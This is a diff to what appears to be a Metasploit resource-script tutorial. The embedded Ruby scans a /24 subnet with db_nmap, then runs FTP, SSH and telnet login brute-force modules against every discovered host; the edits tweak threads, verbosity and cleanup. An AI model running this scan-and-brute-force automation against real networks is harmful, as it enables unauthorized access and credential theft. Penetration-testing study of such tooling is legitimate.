@@ -254,6 +254,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
        This Metasploit RC file can be used to automate the exploitation process.
        In this example we are just checking msfdb connection status, list database
        hosts, services and export the contents of database to template.xml local file.
+
     Author:
        r00t-3xp10it  <pedroubuntu10[at]gmail.com>
     |
@@ -292,13 +293,14 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
          This Metasploit RC file can be used to automate the exploitation process.
          In this example we are using db_nmap to populate msfdb database with hosts
          then trigger auxiliary/http/scanner modules againts all hosts inside db.
+
        Author:
          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
      |
      print_line(help)
      Rex::sleep(1.5)
 
-     run_single("db_nmap -sV -Pn -T4 -p 80 --script=banner.nse,http-headers.nse,ip-geolocation-geoplugin.nse --open 192.168.1.0/24")
+     run_single("db_nmap -sV -Pn -T4 -p 80 --script=http-headers.nse,http-security-headers.nse,ip-geolocation-geoplugin.nse --open 192.168.1.0/24")
      run_single("services")
      xhost = framework.db.hosts.map(&:address).join(' ')
            run_single("setg RHOSTS #{xhost}")
@@ -310,6 +312,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
            run_single("exploit")
      run_single("unsetg RHOSTS")
      run_single("services -d")
+     run_single("hosts -d")
    </ruby>
 ```
 **Run the script:** msfconsole -r /root/http_recon.rc
@@ -361,7 +364,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               run_single("exploit")
               run_single("use auxiliary/scanner/ftp/ftp_login")
               run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
-              run_single("set THREADS 105")
+              run_single("set THREADS 70")
               run_single("exploit")
          end
 
@@ -369,6 +372,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               print_warning("## Target port: 22 ssh found")
               run_single("use auxiliary/scanner/ssh/ssh_login")
               run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
+              run_single("set VERBOSE true")
               run_single("exploit")
          end
 
@@ -378,7 +382,8 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               run_single("exploit")
               run_single("use auxiliary/scanner/telnet/telnet_login")
               run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
-              run_single("set THREADS 16")
+              run_single("set VERBOSE true")
+              run_single("set THREADS 30")
               run_single("exploit")
          end
 
@@ -413,7 +418,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
          end
       print_warning("## Cleaning Database.")
       run_single("unsetg RHOSTS USERPASS_FILE")
-      run_single("unset THREADS")
+      run_single("unset THREADS VERBOSE USERPASS_FILE")
      run_single("services -d")
      run_single("hosts -d")
    </ruby>
